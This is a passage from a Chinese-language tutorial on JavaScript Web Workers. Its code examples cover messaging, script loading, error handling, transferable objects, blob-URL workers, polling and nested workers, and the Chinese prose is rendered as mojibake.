<h4 id="Worker-çº¿ç¨‹"><a href="#Worker-çº¿ç¨‹" class="headerlink" title="Worker çº¿ç¨‹"></a>Worker çº¿ç¨‹</h4><p>Worker çº¿ç¨‹å†…éƒ¨éœ€è¦æœ‰ä¸€ä¸ªç›‘å¬å‡½æ•°ï¼Œç›‘å¬<code>message</code>äº‹ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  self.postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>self</code>ä»£è¡¨å­çº¿ç¨‹è‡ªèº«ï¼Œå³å­çº¿ç¨‹çš„å…¨å±€å¯¹è±¡ã€‚å› æ­¤ï¼Œç­‰åŒäºä¸‹é¢ä¸¤ç§å†™æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å†™æ³•ä¸€</span><br><span class="line">this.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  this.postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; å†™æ³•äºŒ</span><br><span class="line">addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>é™¤äº†ä½¿ç”¨<code>self.addEventListener()</code>æŒ‡å®šç›‘å¬å‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>self.onmessage</code>æŒ‡å®šã€‚ç›‘å¬å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œå®ƒçš„<code>data</code>å±æ€§åŒ…å«ä¸»çº¿ç¨‹å‘æ¥çš„æ•°æ®ã€‚<code>self.postMessage()</code>æ–¹æ³•ç”¨æ¥å‘ä¸»çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</p>
<p>æ ¹æ®ä¸»çº¿ç¨‹å‘æ¥çš„æ•°æ®ï¼ŒWorker çº¿ç¨‹å¯ä»¥è°ƒç”¨ä¸åŒçš„æ–¹æ³•ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  var data &#x3D; e.data;</span><br><span class="line">  switch (data.cmd) &#123;</span><br><span class="line">    case &#39;start&#39;:</span><br><span class="line">      self.postMessage(&#39;WORKER STARTED: &#39; + data.msg);</span><br><span class="line">      break;</span><br><span class="line">    case &#39;stop&#39;:</span><br><span class="line">      self.postMessage(&#39;WORKER STOPPED: &#39; + data.msg);</span><br><span class="line">      self.close(); &#x2F;&#x2F; Terminates the worker.</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      self.postMessage(&#39;Unknown command: &#39; + data.msg);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>self.close()</code>ç”¨äºåœ¨ Worker å†…éƒ¨å…³é—­è‡ªèº«ã€‚</p>
<h4 id="Worker-åŠ è½½è„šæœ¬"><a href="#Worker-åŠ è½½è„šæœ¬" class="headerlink" title="Worker åŠ è½½è„šæœ¬"></a>Worker åŠ è½½è„šæœ¬</h4><p>Worker å†…éƒ¨å¦‚æœè¦åŠ è½½å…¶ä»–è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªä¸“é—¨çš„æ–¹æ³•<code>importScripts()</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&#39;script1.js&#39;);</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•å¯ä»¥åŒæ—¶åŠ è½½å¤šä¸ªè„šæœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&#39;script1.js&#39;, &#39;script2.js&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h4><p>ä¸»çº¿ç¨‹å¯ä»¥ç›‘å¬ Worker æ˜¯å¦å‘ç”Ÿé”™è¯¯ã€‚å¦‚æœå‘ç”Ÿé”™è¯¯ï¼ŒWorker ä¼šè§¦å‘ä¸»çº¿ç¨‹çš„<code>error</code>äº‹ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">worker.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(</span><br><span class="line">    &#39;ERROR: Line &#39;, event.lineno, &#39; in &#39;, event.filename, &#39;: &#39;, event.message</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æˆ–è€…</span><br><span class="line">worker.addEventListener(&#39;error&#39;, function (event) &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Worker å†…éƒ¨ä¹Ÿå¯ä»¥ç›‘å¬<code>error</code>äº‹ä»¶ã€‚</p>
<h4 id="å…³é—­-Worker"><a href="#å…³é—­-Worker" class="headerlink" title="å…³é—­ Worker"></a>å…³é—­ Worker</h4><p>ä½¿ç”¨å®Œæ¯•ï¼Œä¸ºäº†èŠ‚çœç³»ç»Ÿèµ„æºï¼Œå¿…é¡»å…³é—­ Workerã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ä¸»çº¿ç¨‹</span><br><span class="line">worker.terminate();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker çº¿ç¨‹</span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure>

<h3 id="æ•°æ®é€šä¿¡"><a href="#æ•°æ®é€šä¿¡" class="headerlink" title="æ•°æ®é€šä¿¡"></a>æ•°æ®é€šä¿¡</h3><p>å‰é¢è¯´è¿‡ï¼Œä¸»çº¿ç¨‹ä¸ Worker ä¹‹é—´çš„é€šä¿¡å†…å®¹ï¼Œå¯ä»¥æ˜¯æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§é€šä¿¡æ˜¯æ‹·è´å…³ç³»ï¼Œå³æ˜¯ä¼ å€¼è€Œä¸æ˜¯ä¼ å€ï¼ŒWorker å¯¹é€šä¿¡å†…å®¹çš„ä¿®æ”¹ï¼Œä¸ä¼šå½±å“åˆ°ä¸»çº¿ç¨‹ã€‚äº‹å®ä¸Šï¼Œæµè§ˆå™¨å†…éƒ¨çš„è¿è¡Œæœºåˆ¶æ˜¯ï¼Œå…ˆå°†é€šä¿¡å†…å®¹ä¸²è¡ŒåŒ–ï¼Œç„¶åæŠŠä¸²è¡ŒåŒ–åçš„å­—ç¬¦ä¸²å‘ç»™ Workerï¼Œåè€…å†å°†å®ƒè¿˜åŸã€‚</p>
<p>ä¸»çº¿ç¨‹ä¸ Worker ä¹‹é—´ä¹Ÿå¯ä»¥äº¤æ¢äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚ Fileã€Blobã€ArrayBuffer ç­‰ç±»å‹ï¼Œä¹Ÿå¯ä»¥åœ¨çº¿ç¨‹ä¹‹é—´å‘é€ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ä¸»çº¿ç¨‹</span><br><span class="line">var uInt8Array &#x3D; new Uint8Array(new ArrayBuffer(10));</span><br><span class="line">for (var i &#x3D; 0; i &lt; uInt8Array.length; ++i) &#123;</span><br><span class="line">  uInt8Array[i] &#x3D; i * 2; &#x2F;&#x2F; [0, 2, 4, 6, 8,...]</span><br><span class="line">&#125;</span><br><span class="line">worker.postMessage(uInt8Array);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker çº¿ç¨‹</span><br><span class="line">self.onmessage &#x3D; function (e) &#123;</span><br><span class="line">  var uInt8Array &#x3D; e.data;</span><br><span class="line">  postMessage(&#39;Inside worker.js: uInt8Array.toString() &#x3D; &#39; + uInt8Array.toString());</span><br><span class="line">  postMessage(&#39;Inside worker.js: uInt8Array.byteLength &#x3D; &#39; + uInt8Array.byteLength);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œæ‹·è´æ–¹å¼å‘é€äºŒè¿›åˆ¶æ•°æ®ï¼Œä¼šé€ æˆæ€§èƒ½é—®é¢˜ã€‚æ¯”å¦‚ï¼Œä¸»çº¿ç¨‹å‘ Worker å‘é€ä¸€ä¸ª 500MB æ–‡ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æµè§ˆå™¨ä¼šç”Ÿæˆä¸€ä¸ªåŸæ–‡ä»¶çš„æ‹·è´ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒJavaScript å…è®¸ä¸»çº¿ç¨‹æŠŠäºŒè¿›åˆ¶æ•°æ®ç›´æ¥è½¬ç§»ç»™å­çº¿ç¨‹ï¼Œä½†æ˜¯ä¸€æ—¦è½¬ç§»ï¼Œä¸»çº¿ç¨‹å°±æ— æ³•å†ä½¿ç”¨è¿™äº›äºŒè¿›åˆ¶æ•°æ®äº†ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹æ•°æ®çš„éº»çƒ¦å±€é¢ã€‚è¿™ç§è½¬ç§»æ•°æ®çš„æ–¹æ³•ï¼Œå«åš<a href="https://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects" target="_blank" rel="noopener">Transferable Objects</a>ã€‚è¿™ä½¿å¾—ä¸»çº¿ç¨‹å¯ä»¥å¿«é€ŸæŠŠæ•°æ®äº¤ç»™ Workerï¼Œå¯¹äºå½±åƒå¤„ç†ã€å£°éŸ³å¤„ç†ã€3D è¿ç®—ç­‰å°±éå¸¸æ–¹ä¾¿äº†ï¼Œä¸ä¼šäº§ç”Ÿæ€§èƒ½è´Ÿæ‹…ã€‚</p>
<p>å¦‚æœè¦ç›´æ¥è½¬ç§»æ•°æ®çš„æ§åˆ¶æƒï¼Œå°±è¦ä½¿ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Transferable Objects æ ¼å¼</span><br><span class="line">worker.postMessage(arrayBuffer, [arrayBuffer]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ä¾‹å­</span><br><span class="line">var ab &#x3D; new ArrayBuffer(1);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br></pre></td></tr></table></figure>

<h3 id="åŒé¡µé¢çš„-Web-Worker"><a href="#åŒé¡µé¢çš„-Web-Worker" class="headerlink" title="åŒé¡µé¢çš„ Web Worker"></a>åŒé¡µé¢çš„ Web Worker</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒWorker è½½å…¥çš„æ˜¯ä¸€ä¸ªå•ç‹¬çš„ JavaScript è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥è½½å…¥ä¸ä¸»çº¿ç¨‹åœ¨åŒä¸€ä¸ªç½‘é¡µçš„ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script id&#x3D;&quot;worker&quot; type&#x3D;&quot;app&#x2F;worker&quot;&gt;</span><br><span class="line">      addEventListener(&#39;message&#39;, function () &#123;</span><br><span class="line">        postMessage(&#39;some message&#39;);</span><br><span class="line">      &#125;, false);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯ä¸€æ®µåµŒå…¥ç½‘é¡µçš„è„šæœ¬ï¼Œæ³¨æ„å¿…é¡»æŒ‡å®š<code>&lt; script&gt;</code>æ ‡ç­¾çš„<code>type</code>å±æ€§æ˜¯ä¸€ä¸ªæµè§ˆå™¨ä¸è®¤è¯†çš„å€¼ï¼Œä¸Šä¾‹æ˜¯<code>app/worker</code>ã€‚</p>
<p>ç„¶åï¼Œè¯»å–è¿™ä¸€æ®µåµŒå…¥é¡µé¢çš„è„šæœ¬ï¼Œç”¨ Worker æ¥å¤„ç†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var blob &#x3D; new Blob([document.querySelector(&#39;#worker&#39;).textContent]);</span><br><span class="line">var url &#x3D; window.URL.createObjectURL(blob);</span><br><span class="line">var worker &#x3D; new Worker(url);</span><br><span class="line"></span><br><span class="line">worker.onmessage &#x3D; function (e) &#123;</span><br><span class="line">  &#x2F;&#x2F; e.data &#x3D;&#x3D;&#x3D; &#39;some message&#39;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå…ˆå°†åµŒå…¥ç½‘é¡µçš„è„šæœ¬ä»£ç ï¼Œè½¬æˆä¸€ä¸ªäºŒè¿›åˆ¶å¯¹è±¡ï¼Œç„¶åä¸ºè¿™ä¸ªäºŒè¿›åˆ¶å¯¹è±¡ç”Ÿæˆ URLï¼Œå†è®© Worker åŠ è½½è¿™ä¸ª URLã€‚è¿™æ ·å°±åšåˆ°äº†ï¼Œä¸»çº¿ç¨‹å’Œ Worker çš„ä»£ç éƒ½åœ¨åŒä¸€ä¸ªç½‘é¡µä¸Šé¢ã€‚</p>
<h3 id="å®ä¾‹ï¼šWorker-çº¿ç¨‹å®Œæˆè½®è¯¢"><a href="#å®ä¾‹ï¼šWorker-çº¿ç¨‹å®Œæˆè½®è¯¢" class="headerlink" title="å®ä¾‹ï¼šWorker çº¿ç¨‹å®Œæˆè½®è¯¢"></a>å®ä¾‹ï¼šWorker çº¿ç¨‹å®Œæˆè½®è¯¢</h3><p>æœ‰æ—¶ï¼Œæµè§ˆå™¨éœ€è¦è½®è¯¢æœåŠ¡å™¨çŠ¶æ€ï¼Œä»¥ä¾¿ç¬¬ä¸€æ—¶é—´å¾—çŸ¥çŠ¶æ€æ”¹å˜ã€‚è¿™ä¸ªå·¥ä½œå¯ä»¥æ”¾åœ¨ Worker é‡Œé¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function createWorker(f) &#123;</span><br><span class="line">  var blob &#x3D; new Blob([&#39;(&#39; + f.toString() + &#39;)()&#39;]);</span><br><span class="line">  var url &#x3D; window.URL.createObjectURL(blob);</span><br><span class="line">  var worker &#x3D; new Worker(url);</span><br><span class="line">  return worker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var pollingWorker &#x3D; createWorker(function (e) &#123;</span><br><span class="line">  var cache;</span><br><span class="line"></span><br><span class="line">  function compare(new, old) &#123; ... &#125;;</span><br><span class="line"></span><br><span class="line">  setInterval(function () &#123;</span><br><span class="line">    fetch(&#39;&#x2F;my-api-endpoint&#39;).then(function (res) &#123;</span><br><span class="line">      var data &#x3D; res.json();</span><br><span class="line"></span><br><span class="line">      if (!compare(data, cache)) &#123;</span><br><span class="line">        cache &#x3D; data;</span><br><span class="line">        self.postMessage(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, 1000)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pollingWorker.onmessage &#x3D; function () &#123;</span><br><span class="line">  &#x2F;&#x2F; render data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pollingWorker.postMessage(&#39;init&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒWorker æ¯ç§’é’Ÿè½®è¯¢ä¸€æ¬¡æ•°æ®ï¼Œç„¶åè·Ÿç¼“å­˜åšæ¯”è¾ƒã€‚å¦‚æœä¸ä¸€è‡´ï¼Œå°±è¯´æ˜æœåŠ¡ç«¯æœ‰äº†æ–°çš„å˜åŒ–ï¼Œå› æ­¤å°±è¦é€šçŸ¥ä¸»çº¿ç¨‹ã€‚</p>
<h3 id="å®ä¾‹ï¼š-Worker-æ–°å»º-Worker"><a href="#å®ä¾‹ï¼š-Worker-æ–°å»º-Worker" class="headerlink" title="å®ä¾‹ï¼š Worker æ–°å»º Worker"></a>å®ä¾‹ï¼š Worker æ–°å»º Worker</h3><p>Worker çº¿ç¨‹å†…éƒ¨è¿˜èƒ½å†æ–°å»º Worker çº¿ç¨‹ï¼ˆç›®å‰åªæœ‰ Firefox æµè§ˆå™¨æ”¯æŒï¼‰ã€‚ä¸‹é¢çš„ä¾‹å­æ˜¯å°†ä¸€ä¸ªè®¡ç®—å¯†é›†çš„ä»»åŠ¡ï¼Œåˆ†é…åˆ°10ä¸ª Workerã€‚</p>
<p>ä¸»çº¿ç¨‹ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var worker &#x3D; new Worker(&#39;worker.js&#39;);</span><br><span class="line">worker.onmessage &#x3D; function (event) &#123;</span><br><span class="line">  document.getElementById(&#39;result&#39;).textContent &#x3D; event.data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Worker çº¿ç¨‹ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; worker.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; settings</span><br><span class="line">var num_workers &#x3D; 10;</span><br><span class="line">var items_per_worker &#x3D; 1000000;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; start the workers</span><br><span class="line">var result &#x3D; 0;</span><br><span class="line">var pending_workers &#x3D; num_workers;</span><br><span class="line">for (var i &#x3D; 0; i &lt; num_workers; i +&#x3D; 1) &#123;</span><br><span class="line">  var worker &#x3D; new Worker(&#39;core.js&#39;);</span><br><span class="line">  worker.postMessage(i * items_per_worker);</span><br><span class="line">  worker.postMessage((i + 1) * items_per_worker);</span><br><span class="line">  worker.onmessage &#x3D; storeResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; handle the results</span><br><span class="line">function storeResult(event) &#123;</span><br><span class="line">  result +&#x3D; event.data;</span><br><span class="line">  pending_workers -&#x3D; 1;</span><br><span class="line">  if (pending_workers &lt;&#x3D; 0)</span><br><span class="line">    postMessage(result); &#x2F;&#x2F; finished!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒWorker çº¿ç¨‹å†…éƒ¨æ–°å»ºäº†10ä¸ª Worker çº¿ç¨‹ï¼Œå¹¶ä¸”ä¾æ¬¡å‘è¿™10ä¸ª Worker å‘é€æ¶ˆæ¯ï¼Œå‘ŠçŸ¥äº†è®¡ç®—çš„èµ·ç‚¹å’Œç»ˆç‚¹ã€‚è®¡ç®—ä»»åŠ¡è„šæœ¬çš„ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; core.js</span><br><span class="line">var start;</span><br><span class="line">onmessage &#x3D; getStart;</span><br><span class="line">function getStart(event) &#123;</span><br><span class="line">  start &#x3D; event.data;</span><br><span class="line">  onmessage &#x3D; getEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var end;</span><br><span class="line">function getEnd(event) &#123;</span><br><span class="line">  end &#x3D; event.data;</span><br><span class="line">  onmessage &#x3D; null;</span><br><span class="line">  work();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function work() &#123;</span><br><span class="line">  var result &#x3D; 0;</span><br><span class="line">  for (var i &#x3D; start; i &lt; end; i +&#x3D; 1) &#123;</span><br><span class="line">    &#x2F;&#x2F; perform some complex calculation here</span><br><span class="line">    result +&#x3D; 1;</span><br><span class="line">  &#125;</span><br><span class="line">  postMessage(result);</span><br><span class="line">  close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="ä¸»çº¿ç¨‹-1"><a href="#ä¸»çº¿ç¨‹-1" class="headerlink" title="ä¸»çº¿ç¨‹"></a>ä¸»çº¿ç¨‹</h4><p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>Worker()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ä¾›ä¸»çº¿ç¨‹ç”Ÿæˆ Worker çº¿ç¨‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var myWorker &#x3D; new Worker(jsUrl, options);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>æ„é€ å‡½æ•°ï¼Œå¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è„šæœ¬çš„ç½‘å€ï¼ˆå¿…é¡»éµå®ˆåŒæºæ”¿ç­–ï¼‰ï¼Œè¯¥å‚æ•°æ˜¯å¿…éœ€çš„ï¼Œä¸”åªèƒ½åŠ è½½ JS è„šæœ¬ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯é…ç½®å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯é€‰ã€‚å®ƒçš„ä¸€ä¸ªä½œç”¨å°±æ˜¯æŒ‡å®š Worker çš„åç§°ï¼Œç”¨æ¥åŒºåˆ†å¤šä¸ª Worker çº¿ç¨‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ä¸»çº¿ç¨‹</span><br><span class="line">var myWorker &#x3D; new Worker(&#39;worker.js&#39;, &#123; name : &#39;myWorker&#39; &#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker çº¿ç¨‹</span><br><span class="line">self.name &#x2F;&#x2F; myWorker</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>æ„é€ å‡½æ•°è¿”å›ä¸€ä¸ª Worker çº¿ç¨‹å¯¹è±¡ï¼Œç”¨æ¥ä¾›ä¸»çº¿ç¨‹æ“ä½œ Workerã€‚Worker çº¿ç¨‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¦‚ä¸‹ã€‚</p>
<ul>
<li>Worker.onerrorï¼šæŒ‡å®š error äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>Worker.onmessageï¼šæŒ‡å®š message äº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå‘é€è¿‡æ¥çš„æ•°æ®åœ¨<code>Event.data</code>å±æ€§ä¸­ã€‚</li>
<li>Worker.onmessageerrorï¼šæŒ‡å®š messageerror äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚å‘é€çš„æ•°æ®æ— æ³•åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</li>
<li>Worker.postMessage()ï¼šå‘ Worker çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</li>
<li>Worker.terminate()ï¼šç«‹å³ç»ˆæ­¢ Worker çº¿ç¨‹ã€‚</li>
</ul>
<h4 id="Worker-çº¿ç¨‹-1"><a href="#Worker-çº¿ç¨‹-1" class="headerlink" title="Worker çº¿ç¨‹"></a>Worker çº¿ç¨‹</h4><p>Web Worker æœ‰è‡ªå·±çš„å…¨å±€å¯¹è±¡ï¼Œä¸æ˜¯ä¸»çº¿ç¨‹çš„<code>window</code>ï¼Œè€Œæ˜¯ä¸€ä¸ªä¸“é—¨ä¸º Worker å®šåˆ¶çš„å…¨å±€å¯¹è±¡ã€‚å› æ­¤å®šä¹‰åœ¨<code>window</code>ä¸Šé¢çš„å¯¹è±¡å’Œæ–¹æ³•ä¸æ˜¯å…¨éƒ¨éƒ½å¯ä»¥ä½¿ç”¨ã€‚</p>
<p>Worker çº¿ç¨‹æœ‰ä¸€äº›è‡ªå·±çš„å…¨å±€å±æ€§å’Œæ–¹æ³•ã€‚</p>
<ul>
<li>self.nameï¼š Worker çš„åå­—ã€‚è¯¥å±æ€§åªè¯»ï¼Œç”±æ„é€ å‡½æ•°æŒ‡å®šã€‚</li>
<li>self.onmessageï¼šæŒ‡å®š<code>message</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li>self.onmessageerrorï¼šæŒ‡å®š messageerror äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚å‘é€çš„æ•°æ®æ— æ³•åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</li>
<li>self.close()ï¼šå…³é—­ Worker çº¿ç¨‹ã€‚</li>
<li>self.postMessage()ï¼šå‘äº§ç”Ÿè¿™ä¸ª Worker çš„çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</li>
